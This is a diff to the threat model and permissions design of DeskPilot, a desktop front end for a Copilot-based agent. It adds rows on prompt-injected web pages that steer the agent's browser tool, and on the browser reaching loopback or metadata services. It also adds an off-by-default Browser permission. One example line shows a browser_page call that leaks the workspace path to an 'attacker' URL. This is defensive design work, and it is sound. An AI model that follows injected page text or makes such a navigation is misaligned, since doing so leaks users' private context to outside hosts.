@@ -33,6 +33,8 @@ flowchart LR
 | T3 | Another local process calls the API (CSRF/port-scan). | Require a per-launch **session token** (random, printed by the launcher and embedded in the served `index.html`) on every `/api/*` call; check `Origin`/`Host` headers; reject cross-origin. |
 | T4 | The cached Copilot OAuth token is read by another user on a shared machine. | Inherited Engine behaviour (clear-text at the Engine's default token dot-file in the home directory, `~/.shellpilot-token`; historically `~/.copilot-demo-token`); DeskPilot documents it, derives the path from the Engine rather than hardcoding it, and recommends single-user machines; encrypted storage tracked upstream. |
 | T5 | Prompt injection from fetched web pages or read files steers the agent. | Browsing/File are Permissions the user can turn off; Activity surfaces fetched URLs and read files; docs warn that agent output reflects untrusted content. |
+| T5a | A prompt-injected **live page** steers the browser into carrying the Model's context out through a URL. | This is the browser feature's controlling threat, and it is not obvious: the browser holds no secrets (throwaway profile, no sign-ins, no local file access), but the **Model** holds the conversation, the Workspace Folder path and prior Turn content, and the Model chooses the next address. An injected page inducing `browser_page(open, "https://attacker/?ctx=<workspace path>")` exfiltrates through the address itself, with no file read and no command run. Broken by architecture, not by wording: scope is derived from the address the task already names, and any top-level navigation outside it **stops before the request leaves** and raises an approval card showing the whole URL including the query string. Enforcement is in the Node supervisor's request interceptor, below the Model, which also sees redirect chains, nested frames and pop-ups that the pre-flight check cannot. Page content can never widen scope; only the user can, per run from the card or durably from Settings. Off-origin script, WebSocket, XHR, fetch, beacon and all downloads are blocked outright; off-origin images, stylesheets and fonts are allowed because the page controls those and the page knows no secrets. `file:`, `data:`, `javascript:`, `blob:`, plain `http`, embedded credentials, IP literals, single-label and `.local` hosts are refused outright and are never offered as an approvable card. |
+| T5b | The browser reaches DeskPilot's own API, the local network, or a cloud metadata service. | Loopback, RFC1918, link-local and every other IP literal are classified `deny`, **before** the scope match, so a Project that added `127.0.0.1` to its domain list cannot re-open the path. Single-label hosts (`https://intranet/`) and `.local` names are refused for the same reason. This matters specifically because DeskPilot's own control surface is on loopback behind a session token that a same-machine browser navigation would carry. |
 | T6 | Secrets in agent output or logs. | The Host Server does not persist prompts/answers to disk in v1; no server-side logging of Message bodies beyond memory; Usage logging excludes content. |
 | T7 | A runaway tool loop or retry policy burns cost. | `MaxToolIterations` cap (Engine) exposed in Settings; response retries default to 2 and are bounded at 100, stop after any answer or Tool Activity, and state that failed attempts may consume Copilot credits; per-Turn Usage shown; Stop control. |
 | T8 | The filesystem endpoints (folder picker + explorer) read or create arbitrary paths. | Loopback + session-token gated like all `/api/*`. They enumerate and create **directories only**, never file contents. `mkdir` accepts a single path segment (separators and `..` rejected). The explorer tree (`/api/fs/tree`) is confined to the selected Project's folder; a path escaping it is refused. |
@@ -259,10 +261,22 @@ model:
 | Terminal | `-DisableTerminal` | "Can **run commands** as you." |
 | Ask-User | `-DisableUserPrompts` | "Can pause to ask you a question." |
 | User Tools | `-DisableUserTools` | "Can call tools you've registered." |
+| Browser | *(none — a User Tool)* | "Opens a throwaway browser and follows links. Asks before leaving the site." |
 
 Defaults (v1): Browsing **on**, File **on**, Terminal **off**, Ask-User **on**,
-User Tools **on**. Terminal defaults off because it is the highest-blast-radius
-Tool for a non-technical user; turning it on is a deliberate act.
+User Tools **on**, Browser **off**. Terminal defaults off because it is the
+highest-blast-radius Tool for a non-technical user; turning it on is a
+deliberate act.
+
+**Browser is a separate Permission and Browsing does not imply it.** Retrieving
+one address and driving a live page are different amounts of authority. It has
+no Engine switch because the Engine has no interactive browser: it gates
+DeskPilot's own `browser_page` User Tool, and is therefore honoured by not
+registering that Tool for the Turn. Switching it on does not make a browser
+appear — without Node, the pinned Playwright and its browser build, the Tool is
+reported unavailable in Diagnostics rather than advertised to the Model and then
+failing on every call. The runtime is downloaded only from an explicit
+Diagnostics action; nothing on a Turn's path can acquire an executable.
 
 **DeskPilot's own User Tools are not covered by that 1:1 mapping.** A Tool
 registered with `Register-ShpTool` belongs to the User Tools category, so
